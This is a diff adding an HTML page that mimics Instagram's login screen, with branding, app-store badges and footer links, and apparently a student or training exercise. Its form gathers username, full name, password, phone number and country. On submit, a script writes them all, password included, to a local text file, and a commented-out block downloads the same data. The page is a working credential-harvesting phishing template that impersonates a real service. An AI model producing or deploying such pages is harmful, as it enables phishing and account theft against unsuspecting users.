@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Instagram.LOGIN</title>
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<style>
+    h1{font-family:apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;padding-left:40px;}
+
+    #img2{height:150px;margin-left:10px;}
+
+    #img3{height:500px;}
+
+    .head{display:flex;}
+
+    .form{border-width:5px;border-radius:10px;font-size:20px;padding-left:10px; margin-bottom: 15px;}
+
+    #button{border-width:5px;border-radius:10px;font-size:20px;padding:10px;color:white;background-color:blue;padding-left:100px;padding-right:100px; margin-top:10px;}
+
+    .fb{height:50px;}
+
+    .cap{padding-bottom:20px;font-size:15px;font-weight:bold;color:blue;font-family:inherit;}
+
+    main{display:flex}
+
+    .p{color:blue;}
+
+    .main{outline-width:3px;outline-style:solid;padding:20px;margin:10px;}
+
+    .h3{outline-width:3px;outline-style:solid;padding:20px;margin:10px;}
+
+    .image{width:200px;}
+
+    .get{display:flex;}
+
+    #imagee{width:150px;}
+
+    .strong{font-size:20px;padding-left:50px;}
+
+    .nav a{color:rgba(var(--i1d,38,38,38),1);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;padding-top:50px; font:bold;}
+
+    footer{display:flex; background-color: lightpink;padding:10px;}
+
+    #ln{background-color: lightpink;}
+    #copy{
+        padding-left:50px;}
+        #noti{color:red; margin-left:90px;margin-top:0px;}
+        #notif{color:red;margin-left:90px;margin-top:0px;}
+        #notii{color:red;margin-left:90px;margin-top:0px;}
+        #fullname{color:red;margin-left:90px;margin-top:0px;}
+        
+</style>
+</head>
+
+<body>
+<header class="head">
+    <img id="img3" src="IMAGEGIF.gif">
+    <div >
+    <div class="main">
+        <!--<img id="img2" src="insta.webp">-->
+        <h1>Instagram</h1>
+
+        <form name="RegForm" 
+		onsubmit="return validate()"  onsubmit="savFile()" method="post" action="instaSuccess.html" >
+
+            <strong>UserName : </strong><input id="Uname" class="form" type="text"  name="Name"  pattern="^(?=.{8,20}$)(?![_.])(?!.*[_.]{2})[a-zA-Z0-9._]+(?<![_.])$" ></input><br>
+            <p id="notif"></p>
+            <strong>Full Name : </strong><input id="Fname" class="form" type="text" name="Fname">
+            <p id="fullname"></p>
+            <br>
+           <strong>Password : </strong><input id="passwrd" class="form" type="password" name="Pass"><br>
+            <p id="noti"></p>
+            <strong>Mobile :&nbsp;&nbsp; &nbsp;  </strong><input id="telep" pattern="^\d{10}$" type="tel" class="form" name="tele">
+            <p id="notii" ></p>
+            <div>
+                <strong> Country&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</strong><select id="selCountry" class="form" name="country">
+                    <option selected value="">-- Choose the country --</option>
+                    <option value="India">India</option>
+                    <option value="Japan">Japan</option>
+                    <option value="USA">USA</option>
+                </select>
+            </div>
+           <br> <input id="button" type="submit" value="Log In" name="Submit" download="formData.txt">
+            
+        </form>
+        <p>________________or________________</p>
+<main>
+        <img class="fb" src="https://image.shutterstock.com/image-photo/valencia-spain-march-05-2017-260nw-593204357.jpg">
+        <p class="cap">Log In With Facebook</a></p>
+</main>
+        <div class="p">
+            Forget Password?</div>
+        </div>
+        <div class="h3">
+            <h3>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">Sign Up</a></h3>
+        </div>
+        <p><strong class="strong">Get the app</strong></p>
+        <div class="get">
+            <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img class="image" src="https://images-na.ssl-images-amazon.com/images/G/01/digital/adrive/Prints/Retail/Photos_Node/Photos_AppButton_Apple_750x200._CB480900825_.jpg"></a>
+            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DA85C8858-CF18-4557-AD90-
+            98C889A51DEE%26utm_content%3Dlo%26utm_medium%3Dbadge"><img id="imagee" src="https://heartsapp.org/assets/images/play_store.svg"></a>
+            </div>
+
+            </div>
+            </div>
+</header>
+
+<footer>
+    <nav class="nav" >
+        <a href="https://about.instagram.com/about-us"><strong>ABOUT</strong></a>
+        <a href="https://help.instagram.com/"><strong>HELP</strong></a>
+        <a href="https://about.instagram.com/blog"><strong>PRESS</strong></a>
+        <a href="https://www.instagram.com/developer/"><strong>API</strong></a>
+        <a href="https://www.instagram.com/about/jobs/"><strong>JOBS</strong></a>
+        <a href="https://help.instagram.com/519522125107875"><strong>PRIVACY</strong></a>
+        <a href="https://help.instagram.com/581066165581870"><strong>TERMS</strong></a>
+        <a href="https://www.instagram.com/explore/locations/"><strong>LOCATIONS</strong></a>
+        <a href="https://www.instagram.com/directory/profiles/"><strong>TOP ACCOUNTS</strong></a>
+        <a href="https://www.instagram.com/directory/hashtags/"><strong>HASHTAGS</strong></a>
+
+        <input id="ln" list="LnTypes" name="bookType" required auto-complete placeholder="Language" >
+        <datalist id="LnTypes" >
+            <option value="Tamil"></option>
+            <option value="Hindi"></option>
+            <option value="Spanish"></option>
+            <option value="Japanese"></option>
+            <option value="Korean"></option>
+            <option value="Chinese"></option>
+            <option value="Urudu"></option>
+            <option value="Telugu"></option>
+        </datalist>
+    </nav>
+    <br>
+    <p id="copy"><strong>&#xA9 2020 INSTAGRAM FROM FACEBOOK</strong></p>
+</footer>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+<script type="text/javascript">
+
+
+//Display warning message when the text box is empty
+    function validate()
+    {
+        var i=0;
+
+        var name = document.forms["RegForm"]["Name"]; 
+		var pass = document.forms["RegForm"]["Pass"]; 
+        var phone = document.forms["RegForm"]["tele"];
+        var fullname=document.forms["RegForm"]["Fname"]; 
+        var country=document.forms["RegForm"]["selCountry"];
+        if (name.value == "") { 
+            document.getElementById("notif").innerHTML="Please Enter the username*";
+            document.getElementById("Uname").style.borderColor="red";
+			name.focus(); 
+			return false; 
+		}
+        else{
+            i+=1;
+        }
+       
+        
+        if(fullname.value=="")
+        {
+            document.getElementById("fullname").innerHTML="Please enter the full name*";
+            document.getElementById("Fname").style.borderColor="red";
+            fullname.focus();
+            return false;
+        }
+        else{
+            i+=1;
+        }
+       
+        
+        if (pass.value == "") { 
+			document.getElementById("noti").innerHTML="Please Enter the password*";
+            document.getElementById("passwrd").style.borderColor="red";
+			pass.focus(); 
+			return false; 
+		}
+        else{
+            i+=1;
+        }
+       
+       
+        if (phone.value == "") { 
+			document.getElementById("notii").innerHTML="Please Enter the Mobile Number*";
+            document.getElementById("telep").style.borderColor="red";
+			phone.focus(); 
+			return false; 
+		} 
+        else{
+            i+=1;
+        }
+       
+       
+        if (country.value== "") {
+           
+            document.getElementById('selCountry').style.borderColor = "red";
+
+            return false; 
+        }
+        else{
+            i+=1;
+        }
+        if(i==5)
+        {
+            savFile();
+            return true;
+        }
+       
+    
+    
+
+    
+        
+       
+    }
+
+    //jquery for hiding the warning message while clicking on the textbox
+
+        $(document).ready(function(){
+            $("#Uname").click(function(){
+            $("#notif").hide();
+            $("#Uname").css("border","green");
+     
+            });
+        });
+        $(document).ready(function(){
+            $("#Fname").click(function(){
+            $("#fullname").hide();
+            $("#Fname").css("border","green");
+            });
+        });
+        $(document).ready(function(){
+            $("#passwrd").click(function(){
+            $("#noti").hide();
+            $("#passwrd").css("border","green");
+            });
+        });
+        $(document).ready(function(){
+            $("#telep").click(function(){
+            $("#notii").hide();
+            $("#telep").css("border","green");
+            });
+        });
+        $(document).ready(function(){
+            $("#selCountry").click(function(){
+            $("#selCountry").css("border","green");
+            });
+        });
+
+        //Saving the details in the text file
+        
+        function savFile()
+        {
+            var name=document.getElementById("Uname");
+            var pass=document.getElementById("passwrd");
+            var phone=document.getElementById("telep");
+            var fullname=document.getElementById("Fname");
+            var country=document.getElementById("selCountry");
+
+            var data = 
+            '\r UserName: ' + name.value + ' \r\n ' +'Full Name:'+ fullname.value+ '\r\n'+
+            'passWord: ' +pass.value + ' \r\n ' + 
+            'Mobile: ' + phone.value + '\r\n' + 'Country:' + country.value+'\r\n'+'Data Submitted on ' + new Date();
+            
+            var fsobject = new ActiveXObject("Scripting.FileSystemObject");
+            var fileLocation = "D:\\1.Cognizant\\Instagram\\formData.txt";
+            //fsobject.CreateTextFile(fileLocation);
+            var file = fsobject.GetFile(fileLocation);
+            //alert(file);
+            var streamWrite = file.OpenAsTextStream(8);
+            streamWrite.WriteLine(data);
+            streamWrite.Close();
+              
+            // Convert the text to BLOB.
+        /*const textToBLOB = new Blob([data], { type: 'text/plain' });
+        const sFileName = 'formData.txt';
+        	   // The file to save the data.
+
+               // creating a Link (the anchor tag) to download
+               // which is not visible anywhere on the form 
+               let newLink = document.createElement("a");
+
+               //assigning the text file as the link’s download property.
+                newLink.download = sFileName;
+
+                //assign the BLOB object as the href to the newly created Link tag.
+
+                if (window.webkitURL != null) {
+                    newLink.href = window.webkitURL.createObjectURL(textToBLOB);
+                }
+                 else {
+                            newLink.href = window.URL.createObjectURL(textToBLOB);
+                            newLink.style.display = "none";
+                            document.body.appendChild(newLink);
+                        }
+                newLink.click(); */
+            }
+           
+</script>
+</body>
+</html>
+
+
+
